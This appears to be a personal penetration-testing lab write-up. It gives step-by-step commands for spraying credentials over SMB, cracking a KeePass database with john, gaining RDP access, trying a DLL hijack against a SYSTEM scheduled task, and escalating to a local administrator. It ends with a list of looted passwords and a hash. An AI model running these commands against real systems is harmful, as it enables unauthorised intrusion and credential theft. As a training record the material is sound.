- Spraying existing credentials collected from `249`, will reveal `maildmz`, `damon`, `adrian` are all users on `248`
	- Running `netexec smb 192.168.209.248 -d . -u damon -p i6yuT6tym@ --shares` will reveal two non-default shares: `transfer` and `Users`.
- Running `smbclient //192.168.209.248/transfer -U ./damon%i6yuT6tym@` to enumerate SMB share will find  a `KeePass` file `Database.kdbx` under `\DB-back (1)\New Folder\Emma\Documents\`.
	- Run `keepass2john Database.kdbx > keepass.hash` and `john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash` to crack the plaintext password as `welcome1`. ![[Pasted image 20240220140324.png]]
	- Then, run `keepassxc`, load and use the master key `welcome1` to find the password for user `emma` as `SomersetVinyl1!`![[Pasted image 20240220142419.png]]
- Spraying the newly found credential, we can find `emma` has `rdp` access to the current host. Run `xfreerdp /v:192.168.209.248 /u:emma /p:SomersetVinyl1\! /drive:resources,/home/saxon/Desktop /dynamic-resolution` to obtain an `rdp` session.![[Pasted image 20240220142602.png]]
# PrivEsc
- Under `C:\`, we can find a interesting executable `BetaMonitor.exe` along with a log file indicating that it is constantly loading a missing `dll` called `BetaLibrary.Dll`.![[Pasted image 20240220145932.png]]
	- Run `schtasks /query /v /fo LIST > task.txt` and looks for `BetaMonitor.exe` can identify that the executable is ran as `system` at start-up.![[Pasted image 20240220150144.png]]
- While we don't have write privilege to the directory where the executable is located, `winpeas`will identify a weird path belongs to `emma` added to the system path. This is the place we can place out malicious `DLL`.![[Pasted image 20240220152103.png]]
	- Run `copy \\tsclient\resources\BetaLibrary.dll C:\Users\emma\AppData\Local\Microsoft\WindowsApps` and wait for a shell call back.
	- <mark>A Fucking Rabbit Hole;A Fucking Scam!!</mark>
- `winpeas` will identify a `Appkey` in User Environmental Variable which is the password of  user `mark`, a local administrator :<![[Pasted image 20240220154027.png]]
	- Run `xfreerdp /v:192.168.209.248 /u:mark /p:\!8@aBRBYdb3\! /drive:resources,/home/saxon/Desktop` to obtain an `rdp` session and bypass `UAC`.
# Loot
- `emma`: SomersetVinyl1!
- `mark`:!8@aBRBYdb3!
- `Administrator`: 56e4633688c0fdd57c610faf9d7ab8df